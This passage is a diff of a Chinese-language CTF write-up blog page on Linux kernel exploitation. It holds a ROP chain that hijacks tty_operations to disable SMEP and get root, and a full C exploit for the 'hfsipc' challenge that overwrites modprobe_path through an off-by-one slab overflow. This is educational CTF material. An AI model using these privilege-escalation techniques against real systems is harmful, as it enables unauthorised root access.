class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
+
 <p>它是一个函数表，当操作打开的<code>/dev/ptmx</code>时，会调用<code>tty_operations</code>中相应的函数。通过劫持函数表来<code>stack pivot</code>进而通过ROP关闭SMEP并返回到用户空间代码。<code>tty_struct</code>使用大小为0x400的<code>slab</code>（0x200～0x400，具体原因可见slab的划分），但<code>tty_operations</code>并不通过<code>slab</code>分配。</p>
 <p> 解压bzImage获取vmlinux，使用Ropper获取gadget。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-headers-$(uname -r)</span><br><span class="line">sudo /usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinux</span><br><span class="line">Ropper.py --file vmlinux --nocolor &gt; gadget</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">tty_operations.ioctl = xchg_esp_eax;</span><br><span class="line">fake_stack = mmap(xchg_esp_eax &amp; <span class="number">0xfffff000</span>, <span class="number">0x3000</span>, <span class="number">7</span>, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">rop[<span class="number">0</span>] = p_rxx;</span><br><span class="line">rop[<span class="number">1</span>] = <span class="number">0x6f0</span> ; </span><br><span class="line">rop[<span class="number">2</span>] = write_cr4; <span class="comment">// mov cr4, rxx</span></span><br><span class="line">rop[<span class="number">3</span>] = get_root;</span><br><span class="line">rop[<span class="number">4</span>] = swapgs;</span><br><span class="line">rop[<span class="number">5</span>] = iretq;</span><br><span class="line">rop[<span class="number">6</span>] = get_shell;</span><br><span class="line">rop[<span class="number">7</span>] = user_cs;</span><br><span class="line">rop[<span class="number">8</span>] = user_eflags;</span><br><span class="line">rop[<span class="number">9</span>]= user_sp;</span><br><span class="line">rop[<span class="number">10</span>]= user_ss;</span><br><span class="line"><span class="built_in">memcpy</span>(xchg_esp_eax &amp; <span class="number">0xffffffff</span>, data, <span class="keyword">sizeof</span>(data));</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">unsigned long user_cs, user_ss, user_eflags,user_sp	;</span></span><br><span class="line"><span class="comment">void save_stats() &#123;</span></span><br><span class="line"><span class="comment">	asm(</span></span><br><span class="line"><span class="comment">		"movq %%cs, %0\n"</span></span><br><span class="line"><span class="comment">		"movq %%ss, %1\n"</span></span><br><span class="line"><span class="comment">		"movq %%rsp, %3\n"</span></span><br><span class="line"><span class="comment">		"pushfq\n"</span></span><br><span class="line"><span class="comment">		"popq %2\n"</span></span><br><span class="line"><span class="comment">		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)</span></span><br><span class="line"><span class="comment"> 		:</span></span><br><span class="line"><span class="comment"> 		: "memory"</span></span><br><span class="line"><span class="comment"> 	);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">or use mmap area for rsp</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">unsigned long user_cs, user_ss, user_rflags;</span></span><br><span class="line"><span class="comment">static void save_state() &#123;</span></span><br><span class="line"><span class="comment">        asm(</span></span><br><span class="line"><span class="comment">        "movq %%cs, %0\n"</span></span><br><span class="line"><span class="comment">        "movq %%ss, %1\n"</span></span><br><span class="line"><span class="comment">        "pushfq\n"</span></span><br><span class="line"><span class="comment">        "popq %2\n"</span></span><br><span class="line"><span class="comment">        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">tty_operations.ioctl = xchg_esp_eax;</span><br><span class="line">fake_stack = mmap(xchg_esp_eax &amp; <span class="number">0xfffff000</span>, <span class="number">0x3000</span>, <span class="number">7</span>, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">rop[<span class="number">0</span>] = p_rxx;</span><br><span class="line">rop[<span class="number">1</span>] = <span class="number">0x6f0</span> ; </span><br><span class="line">rop[<span class="number">2</span>] = write_cr4; <span class="comment">// mov cr4, rxx</span></span><br><span class="line">rop[<span class="number">3</span>] = get_root;</span><br><span class="line">rop[<span class="number">4</span>] = swapgs;</span><br><span class="line">rop[<span class="number">5</span>] = iretq;</span><br><span class="line">rop[<span class="number">6</span>] = get_shell;</span><br><span class="line">rop[<span class="number">7</span>] = user_cs;</span><br><span class="line">rop[<span class="number">8</span>] = user_eflags;</span><br><span class="line">rop[<span class="number">9</span>]= user_sp;</span><br><span class="line">rop[<span class="number">10</span>]= user_ss;</span><br><span class="line"><span class="built_in">memcpy</span>(xchg_esp_eax &amp; <span class="number">0xffffffff</span>, data, <span class="keyword">sizeof</span>(data));</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">unsigned long user_cs, user_ss, user_eflags,user_sp	;</span></span><br><span class="line"><span class="comment">void save_stats() &#123;</span></span><br><span class="line"><span class="comment">	asm(</span></span><br><span class="line"><span class="comment">		&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="comment">		&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="comment">		&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line"><span class="comment">		&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="comment">		&quot;popq %2\n&quot;</span></span><br><span class="line"><span class="comment">		:&quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_eflags),&quot;=r&quot;(user_sp)</span></span><br><span class="line"><span class="comment"> 		:</span></span><br><span class="line"><span class="comment"> 		: &quot;memory&quot;</span></span><br><span class="line"><span class="comment"> 	);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">or use mmap area for rsp</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">unsigned long user_cs, user_ss, user_rflags;</span></span><br><span class="line"><span class="comment">static void save_state() &#123;</span></span><br><span class="line"><span class="comment">        asm(</span></span><br><span class="line"><span class="comment">        &quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="comment">        &quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="comment">        &quot;pushfq\n&quot;</span></span><br><span class="line"><span class="comment">        &quot;popq %2\n&quot;</span></span><br><span class="line"><span class="comment">        : &quot;=r&quot; (user_cs), &quot;=r&quot; (user_ss), &quot;=r&quot; (user_rflags) : : &quot;memory&quot;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure>
+
 <p>ROP链如上，在对打开的<code>/dev/ptmx</code>进行操作时，执行<code>xchg eax, esp</code>，这个时候<code>rax</code>的值是<code>xchg eax, esp</code>的地址，使得栈被迁移到了我们可控的地方<code>xchg_esp_eax &amp; 0xffffffff</code>。0到2步即修改CR4的值来关闭SMEP，第3步提权，接着4到5步用于返回用户空间（使用iretq指令返回到用户空间，在执行iretq之前，执行swapgs【64bit下】指令。该指令通过用一个MSR中的值交换GS寄存器的内容，用来获取指向内核数据结构的指针，然后才能执行系统调用之类的内核空间程序）。</p>
 <p><code>iretq</code>栈布局：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">|----------------------|</span><br><span class="line">| RIP                  |&lt;== low mem</span><br><span class="line">|----------------------|</span><br><span class="line">| CS                   |</span><br><span class="line">|----------------------|</span><br><span class="line">| EFLAGS               |</span><br><span class="line">|----------------------|</span><br><span class="line">| RSP                  |</span><br><span class="line">|----------------------|</span><br><span class="line">| SS                   |&lt;== high mem</span><br><span class="line">|----------------------|</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">|----------------------|</span><br><span class="line">| RIP                  |&lt;== low mem</span><br><span class="line">|----------------------|</span><br><span class="line">| CS                   |</span><br><span class="line">|----------------------|</span><br><span class="line">| EFLAGS               |</span><br><span class="line">|----------------------|</span><br><span class="line">| RSP                  |</span><br><span class="line">|----------------------|</span><br><span class="line">| SS                   |&lt;== high mem</span><br><span class="line">|----------------------|</span><br></pre></td></tr></table></figure>
+
 <h3 id="0CTF-2017-knote"><a href="#0CTF-2017-knote" class="headerlink" title="0CTF 2017 knote"></a>0CTF 2017 knote</h3><p>[Working Hard]</p>
 <h3 id="Midnight-Sun-CTF-Quals-hfsipc"><a href="#Midnight-Sun-CTF-Quals-hfsipc" class="headerlink" title="Midnight Sun CTF Quals hfsipc"></a>Midnight Sun CTF Quals hfsipc</h3><p><code>off-by-one</code>漏洞，能够向后溢出一个字节，slab的结构使得移出一个字节时能够直接修改<code>fd</code>。通过修改<code>fd</code>能够任意地址读写。</p>
 <h4 id="Hijack-cred"><a href="#Hijack-cred" class="headerlink" title="Hijack cred"></a>Hijack cred</h4><p>找到cred所在的slab区域，将对应的0x3e8改为0x0。</p>
 <h4 id="Hijack-modprobe"><a href="#Hijack-modprobe" class="headerlink" title="Hijack modprobe"></a>Hijack modprobe</h4><p>当系统遇到无法识别格式的程序时，会运行<code>modprobe_path</code>指向的程序进行调用。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHANNEL_CREATE 0xABCD0001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHANNEL_DELETE 0xABCD0002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHANNEL_READ 0xABCD0003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHANNEL_WRITE 0xABCD0004</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">channel_info</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> id;</span><br><span class="line">    <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a new hfs channel</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_channel</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">channel_info</span> <span class="title">channel</span>;</span></span><br><span class="line"></span><br><span class="line">    channel.id = id;</span><br><span class="line">    channel.size = size;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CHANNEL_CREATE, &amp;channel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] Create %d channel\n"</span>, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delete hfs channel</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_channel</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">    ioctl(fd, CHANNEL_DELETE, &amp;id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] Delete %d channel\n"</span>, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read from hfs channel into dest</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_channel</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">char</span> *dest, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">channel_info</span> <span class="title">channel</span>;</span></span><br><span class="line"></span><br><span class="line">    channel.id = id;</span><br><span class="line">    channel.size = size;</span><br><span class="line">    channel.buffer = dest;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CHANNEL_READ, &amp;channel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] Read %d channel\n"</span>, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write into hfs channel from src</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_channel</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">char</span> *src, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">channel_info</span> <span class="title">channel</span>;</span></span><br><span class="line"></span><br><span class="line">    channel.id = id;</span><br><span class="line">    channel.size = size;</span><br><span class="line">    channel.buffer = src;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CHANNEL_WRITE, &amp;channel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] Write %d channel\n"</span>, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trigger</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"/home/user/ll"</span>);</span><br><span class="line">    system(<span class="string">"cat /home/user/flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"echo -ne '#!/bin/sh\n/bin/cp /root/flag /home/user/flag\n/bin/chmod 777 /home/user/flag' &gt; /home/user/getflag.sh"</span>);</span><br><span class="line">    system(<span class="string">"chmod +x /home/user/getflag.sh"</span>);</span><br><span class="line">    system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /home/user/ll"</span>);</span><br><span class="line">    system(<span class="string">"chmod +x /home/user/ll"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] Open hfs device\n"</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/hfs"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] Create initial channels\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>** payload = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>**)buf;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> modprobe_addr = <span class="number">0xffffffff81a3f7a0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (count = <span class="number">1</span>; count &lt; <span class="number">0x11</span>; count++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">5</span>) &#123;</span><br><span class="line">            create_channel(fd, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            create_channel(fd, count, <span class="number">0x20</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    delete_channel(fd, <span class="number">7</span>);</span><br><span class="line">    buf[0x20] = '\x20';</span><br><span class="line">    write_channel(fd, <span class="number">6</span>, buf, <span class="number">0x21</span>);</span><br><span class="line"></span><br><span class="line">    create_channel(fd, <span class="number">0x20</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (count = <span class="number">1</span>; count &lt; <span class="number">5</span>; count++) &#123;</span><br><span class="line">        delete_channel(fd, count);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    payload[<span class="number">0</span>] = <span class="number">0x30</span>;</span><br><span class="line">    payload[<span class="number">1</span>] = modprobe_addr;</span><br><span class="line">    payload[<span class="number">2</span>] = <span class="number">0x100</span>;</span><br><span class="line">    </span><br><span class="line">    write_channel(fd, <span class="number">0x20</span>, payload, <span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">"/home/user/getflag.sh"</span>);</span><br><span class="line">    write_channel(fd, <span class="number">0x30</span>, buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    trigger();</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	exploit();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 